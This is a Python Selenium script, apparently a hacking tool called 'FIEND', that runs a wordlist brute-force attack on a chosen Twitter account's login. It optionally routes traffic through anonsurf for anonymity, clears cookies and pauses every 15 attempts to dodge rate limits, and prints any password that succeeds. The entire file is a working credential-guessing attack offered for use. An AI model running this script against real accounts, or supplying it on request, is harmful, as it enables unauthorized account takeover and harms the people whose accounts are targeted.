from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from time import *
from subprocess import call
from termcolor import colored
print('''
            
    ███████╗██╗███████╗███╗   ██╗██████╗ 
    ██╔════╝██║██╔════╝████╗  ██║██╔══██╗
    █████╗  ██║█████╗  ██╔██╗ ██║██║  ██║
    ██╔══╝  ██║██╔══╝  ██║╚██╗██║██║  ██║
    ██║     ██║███████╗██║ ╚████║██████╔╝
    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ 
                                                ''')


print("\n"+"Before you start the attack please input correct username to avoid any problem  :) ")



driver=webdriver.Firefox()
driver.get("https://mobile.twitter.com/login/")
try:
    color_user=colored("[*]enter Id||Email||phone number: ","blue")
    color_service=colored("[*]Enter service(twitter): ","blue")
    color_wordlistpath=colored("[*]Enter the path of wordlist: ","blue")
    color_delay=colored("[*]Enter the first delay(Recommended 15): ","blue")
    color_delay1=colored("[*]Enter the second delay(Recommended 15): ","blue")
    user=input("{}".format(color_user))
    service=input("{}".format(color_service))
    wordlist_path=input("{}".format(color_wordlistpath))
    delay=input("{}".format(color_delay))
    delay1=input("{}".format(color_delay1))
    
except KeyboardInterrupt:
                    x=colored("GOODBYE :)","red","on_blue",["bold","blink"])
                    print("{}".format(x))
                    exit()


check=input("Do you want to turn anonsurf ? (yes) ")

while True:
    
           if "yes" == check :
            anonsurf=call("sudo anonsurf start ",shell=True)
            sleep(15)
            break
           else:
                break
sleep(5)
clear=call("clear",shell=True)

try:
        passd=open("{}".format(wordlist_path),"r")

      
        for index,line in enumerate(passd):
            
            
            if index % 15 == 0 and index != 0 :
               driver.delete_all_cookies()
               driver.refresh()
               sleep(900)
               driver.refresh()

            

            try:

                if service == "twitter" :
                   x=driver.find_element_by_name("session[username_or_email]")
                   x.clear()
                   x.send_keys("{}".format(user))
                else:
                     break
                     exit()

             
                
                if service == "twitter" :
                   
                    x=driver.find_element_by_name("session[password]")
                    x.clear()
                    x.send_keys("{}".format(line))
                    x.send_keys(Keys.RETURN)
                else:
                     break
                     exit()  
                
                sleep(int(delay))   
                sleep(5)
                if service == "twitter" :
                    assert(("Login on Twitter") in driver.title)
                else:
                     break 
                     exit()
                
                error=colored("[!]the password is incorrect: ","red")
                print("{}{}".format(error,line))
                
                sleep(int(delay1))
                sleep(5)
            except AssertionError:
                                  correct=colored("[+]The password is correct: ","green")
                                  print("{}{}".format(correct,line))
                                  exit()    
                                  
            except Exception as e:
                                  print (" [!]Error %s" % e)
                                  
            except KeyboardInterrupt:
                                     exit()
            
except Exception:
                  error_color=colored("[!]The wordlist_path invalid please check again form your path GOODBYE :) ","red","on_blue",["bold","blink"])
                  print("{}".format(error_color))                                                                     